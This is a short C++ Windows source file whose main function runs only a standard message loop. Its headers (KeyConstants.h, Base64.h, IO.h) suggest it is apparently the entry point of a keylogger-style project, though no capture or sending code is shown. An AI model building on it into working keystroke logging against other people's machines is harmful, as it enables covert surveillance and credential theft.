#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"

using namespace std;
int main()
{MSG msg;
    while(GetMessage(&msg,NULL,0,0)){ /*This function will reciev the msg from us into msg */
    TranslateMessage(&msg); /*then that msg is translated, and forwrded to system eventually*/
    DispatchMessage(&msg);}
   return 0; }
